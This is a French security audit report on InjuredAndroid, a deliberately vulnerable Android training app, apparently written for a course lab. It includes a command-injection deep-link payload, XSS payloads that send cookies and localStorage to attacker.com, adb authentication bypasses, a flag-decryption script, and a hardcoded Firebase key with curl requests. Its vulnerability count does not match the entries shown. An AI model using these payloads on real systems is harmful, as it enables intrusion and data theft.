# Rapport de Vulnérabilités – InjuredAndroid v1.0.12
## Audit de Sécurité Mobile Android

**Classification :** Confidentiel  
**Application :** InjuredAndroid (Package : `b3nac.injuredandroid`)  
**Version :** 1.0.12 (versionCode: 17)  
**SDK Cible :** Android 10 (API 29) | Min SDK : API 21  
**Date d'audit :** 02/04/2026  
**Outil principal :** JADX 1.5.5, ADB 34.0.5, Python3 3.13.7

---

## Résumé Exécutif

L'audit de l'application Android InjuredAndroid a révélé **13 vulnérabilités de sécurité** dont **2 critiques** permettant une exécution de code à distance et une injection JavaScript. L'application présente des failles dans pratiquement toutes les catégories de l'OWASP Mobile Top 10 2024.

### Répartition par sévérité

```
CRITIQUE  ████████████████████  2  (15%)
HAUT      ████████████████████████████████████████  5  (38%)
MOYEN     ████████████████████████████  4  (31%)
FAIBLE    ████████████  2  (16%)
```

---

## CVE / CWE Référencés

| ID | CWE | Titre | Occurrences |
|----|-----|-------|-------------|
| VUL-01 | CWE-78 | OS Command Injection | 1 |
| VUL-02 | CWE-79 | Cross-site Scripting (XSS) | 1 |
| VUL-03 | CWE-284 | Improper Access Control | 3 |
| VUL-04 | CWE-327 | Use of Broken Algorithm | 2 |
| VUL-05 | CWE-321 | Hard-coded Cryptographic Key | 1 |
| VUL-06 | CWE-798 | Use of Hard-coded Credentials | 1 |
| VUL-07 | CWE-312 | Cleartext Storage | 3 |
| VUL-08 | CWE-319 | Cleartext Transmission | 1 |
| VUL-09 | CWE-259 | Hard-coded Password | 1 |

---

## Fiches de Vulnérabilités Détaillées

---

### VUL-01 – Remote Code Execution via Deep Link

| Champ | Valeur |
|-------|--------|
| **Sévérité** | CRITIQUE |
| **CVSS v3.1** | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-78 – OS Command Injection |
| **Fichier** | `RCEActivity.java` |
| **Ligne** | `runtime.exec(filesDir + "/" + queryParameter + " " + queryParameter2)` |

**Description :**  
L'activité `RCEActivity` expose un Deep Link (`flag13://rce`) qui accepte deux paramètres (`binary` et `param`) directement passés à `Runtime.exec()` sans aucune validation ni sanitisation. Un attaquant peut forger un lien malveillant et l'envoyer à la victime pour exécuter du code arbitraire dans le contexte de l'application.

**Scénario d'attaque :**
```
1. Attaquant crée un lien : flag13://rce?binary=../../bin/sh&param=-c%20"id"
2. Victime clique sur le lien (via browser, SMS, QR code)
3. L'application exécute : /data/data/.../files/../../bin/sh -c "id"
4. Résultat : uid=10xxx(b3nac.injuredandroid) - RCE !
```

**Code vulnérable :**
```java
String binary = data.getQueryParameter("binary");
String param = data.getQueryParameter("param");
// AUCUNE VALIDATION !
runtime.exec(filesDir.getParent() + "/files/" + binary + " " + param);
```

**Recommandation :**
- Implémenter une whitelist stricte des binaires autorisés
- Valider et sanitiser TOUS les paramètres des Deep Links
- Utiliser `ProcessBuilder` avec un tableau d'arguments (pas de concatenation)

---

### VUL-02 – Cross-Site Scripting (XSS) dans WebView

| Champ | Valeur |
|-------|--------|
| **Sévérité** | CRITIQUE |
| **CVSS v3.1** | 9.3 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) |
| **CWE** | CWE-79 – Improper Neutralization of Input |
| **Fichier** | `DisplayPostXSS.java` |

**Description :**  
L'activité `DisplayPostXSS` charge le contenu HTML fourni par l'utilisateur dans un `WebView` avec JavaScript activé et sans aucune sanitisation. Toute entrée malveillante est exécutée directement dans le contexte de l'application.

**Code vulnérable :**
```java
settings.setJavaScriptEnabled(true);  // JS activé !
webView.loadData(userInput, "text/html", "UTF-8");  // Non sanitisé !
```

**Payloads de test :**
```html
<script>alert(document.domain)</script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<script>
  // Vol des données stockées localement
  var data = window.localStorage;
  fetch('https://attacker.com/steal?d=' + JSON.stringify(data));
</script>
```

**Impact :**
- Vol de tokens d'authentification
- Accès aux données stockées dans le WebView
- Redirection vers des sites de phishing
- Exécution de code dans le contexte de l'app (privilèges Android)

---

### VUL-03a – Activités Android Exportées Sans Protection

| Champ | Valeur |
|-------|--------|
| **Sévérité** | HAUT |
| **CVSS v3.1** | 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) |
| **CWE** | CWE-284 – Improper Access Control |
| **Fichier** | `AndroidManifest.xml` |

**Activités exposées :**

| Activité | Nom décodé | Impact |
|----------|-----------|--------|
| `b25lActivity` | "one" Activity | Bypass auth Flag 2 |
| `QXV0aA` | "Auth" Activity | Bypass authentification |
| `ExportedProtectedIntent` | - | Accès données protégées |
| `FlagEighteenActivity` | - | Flag 18 sans auth |
| `FlagFiveReceiver` | - | Broadcast receiver |
| `TestBroadcastReceiver` | - | Receiver non protégé |

**Exploitation :**
```bash
# Accès direct sans authentification
adb shell am start -n b3nac.injuredandroid/.b25lActivity
adb shell am start -n b3nac.injuredandroid/.QXV0aA
adb shell am start -n b3nac.injuredandroid/.ExportedProtectedIntent
```

---

### VUL-04 – Utilisation de DES/ECB (Algorithme Obsolète)

| Champ | Valeur |
|-------|--------|
| **Sévérité** | HAUT |
| **CVSS v3.1** | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **CWE** | CWE-327 – Use of a Broken or Risky Cryptographic Algorithm |
| **Fichier** | `k.java` |

**Problèmes cryptographiques identifiés :**

1. **DES (Data Encryption Standard)** – Clé de 56 bits, cassable en moins de 24h
2. **Mode ECB** – Déterministe, même plaintext → même ciphertext, pas d'IV
3. **Clé hardcodée** – `"Captur3Th1s"` encodée en Base64 dans `h.java`

**Démonstration :**
```python
# Déchiffrement du Flag 6
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64

key = b'Captur3T'  # Clé DES 8 bytes (56 bits effectifs)
ct = base64.b64decode('k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==')
cipher = Cipher(algorithms.TripleDES(key * 3), modes.ECB())
decryptor = cipher.decryptor()
plaintext = decryptor.update(ct) + decryptor.finalize()
# Résultat: b"{This_Isn't_Where_I_Parked_My_Car}"
```

---

### VUL-05 – Credentials et Clés Hardcodés

| Champ | Valeur |
|-------|--------|
| **Sévérité** | HAUT |
| **CVSS v3.1** | 7.4 |
| **CWE** | CWE-798 / CWE-321 |

**Inventaire des secrets exposés :**

| Localisation | Type | Valeur |
|-------------|------|--------|
| `FlagOneLoginActivity.java:58` | Mot de passe | `"F1ag_0n3"` |
| `g.java:8` | Donnée encodée | `"4_overdone_omelets"` (Base64) |
| `strings.xml` | Clé de ressource | `"F1ag_thr33"` (clé obfusquée) |
| `h.java:7` | Clé DES | `"Captur3Th1s"` (Base64) |
| `h.java:10` | Clé DES #2 | `"{Captur3Th1sToo}"` (Base64) |
| `strings.xml` | API Key Firebase | `AIzaSyCUImEIOSvqAswLqFak75xhskkB6illd7A` |

---

### VUL-06 – Firebase Database avec Règles Permissives

| Champ | Valeur |
|-------|--------|
| **Sévérité** | HAUT |
| **CVSS v3.1** | 7.3 |
| **CWE** | CWE-284 – Improper Access Control |

**URL Firebase trouvée via décodage ROT47 :**
```python
# Encodage dans h.java
encoded = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?"
decoded = "https://injuredandroid.firebaseio.com/sqlite.json"
```

**Données accessibles publiquement :**
```bash
curl https://injuredandroid.firebaseio.com/sqlite.json
# Retourne les flags chiffrés et les mots de passe !

curl https://injuredandroid.firebaseio.com/aws.json
# Retourne les credentials AWS !

curl https://injuredandroid.firebaseio.com/binary.json
# Retourne les données du flag 11 !
```

---

### VUL-07 – Trafic HTTP Non Chiffré Autorisé

| Champ | Valeur |
|-------|--------|
| **Sévérité** | MOYEN |
| **CVSS v3.1** | 5.9 |
| **CWE** | CWE-319 – Cleartext Transmission |

```xml
<!-- network_security_config.xml -->
<base-config cleartextTrafficPermitted="true"/>
```

Permet les attaques Man-in-the-Middle sur les réseaux non sécurisés (Wi-Fi public).

---

## Matrice de Risque

```
PROBABILITÉ ↑
    HAUTE  | VUL-02 (XSS) | VUL-01 (RCE)  |               |
           |              | VUL-03 (Export)|               |
   MOYENNE | VUL-06 (FB)  | VUL-04 (DES)  | VUL-05 (Creds)|
           | VUL-07 (HTTP)|               |               |
    FAIBLE |              | VUL-08 (MD5)  |               |
           +--FAIBLE------+---MOYEN-------+---CRITIQUE----→ IMPACT
```

---

## Plan de Remédiation Prioritisé

| Priorité | Vulnérabilité | Action | Effort |
|----------|--------------|--------|--------|
| P1 – Immédiat | VUL-01 RCE | Supprimer `runtime.exec()` ou whitelist stricte | Élevé |
| P1 – Immédiat | VUL-02 XSS | Désactiver JS ou ajouter sanitisation | Faible |
| P1 – Immédiat | VUL-05 Secrets | Migrer vers Android Keystore | Moyen |
| P2 – 30 jours | VUL-03 Exported | Ajouter `android:exported="false"` | Faible |
| P2 – 30 jours | VUL-04 DES | Remplacer par AES-256-GCM | Moyen |
| P2 – 30 jours | VUL-06 Firebase | Restreindre les règles Firebase | Faible |
| P3 – 90 jours | VUL-07 HTTP | Activer `cleartextTrafficPermitted="false"` | Faible |
| P3 – 90 jours | VUL-08 MD5 | Utiliser bcrypt/Argon2 | Moyen |

---

## Références

- [OWASP Mobile Top 10 2024](https://owasp.org/www-project-mobile-top-10/)
- [Android Security Best Practices](https://developer.android.com/topic/security/best-practices)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html)
- [NIST Guidelines on Mobile Device Security](https://csrc.nist.gov/publications/detail/sp/800-124/rev-2/final)
- [InjuredAndroid Source Code](https://github.com/B3nac/InjuredAndroid)

---

*Rapport généré automatiquement lors du TP5 – Analyse d'applications Android vulnérables*  
*Outil : Claude Code | Date : 02/04/2026*
